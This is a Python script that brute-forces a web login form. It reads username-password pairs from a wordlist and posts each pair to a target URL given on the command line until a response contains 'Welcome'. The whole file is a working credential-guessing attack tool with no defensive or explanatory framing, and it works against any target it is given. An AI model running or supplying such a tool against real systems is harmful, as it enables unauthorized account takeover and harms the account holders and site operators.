import sys
import requests
import json

def brute_force(target, wordlist_path):
    print("Starting brute-force...")
    print(f"Target: {target}")
    print(f"Wordlist path: {wordlist_path}")

    try:
        with open(wordlist_path, 'r') as file:
            lines = file.read().splitlines()
            print(f"Loaded {len(lines)} lines from wordlist.")
    except Exception as e:
        print(f"Error reading wordlist: {e}")
        return {"error": f"Failed to read wordlist: {e}"}

    results = []
    for line in lines:
        # Split each line into username and password
        parts = line.strip().split(' ')
        if len(parts) < 2:
            print(f"Skipping malformed line: {line}")
            continue
        username, password = parts

        # Define the payload based on the login form fields
        payload = {
            'uname': username,  # Field name for username
            'pass': password    # Field name for password
        }

        try:
            print(f"Trying credentials: {username}:{password}")
            response = requests.post(target, data=payload)

            print(f"Response status code: {response.status_code}")
            print(f"Response text (first 500 chars): {response.text[:500]}")  # Debugging output

            if response.status_code == 200 and "Welcome" in response.text:
                results.append({"username": username, "password": password, "status": "success"})
                print(f"Success: {username}:{password}")
                break
            else:
                results.append({"username": username, "password": password, "status": "failed"})
                print(f"Failed: {username}:{password}")
        except Exception as e:
            results.append({"username": username, "password": password, "status": "error", "message": str(e)})
            print(f"Error: {e}")

    return results

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(json.dumps({"error": "Target URL and wordlist path are required."}))
        sys.exit(1)

    target = sys.argv[1]
    wordlist_path = sys.argv[2]

    try:
        print("Executing brute-force function...")
        result = brute_force(target, wordlist_path)
        print("Brute-force completed. Returning results...")
        print(json.dumps(result))
    except Exception as e:
        print(json.dumps({"error": str(e)}))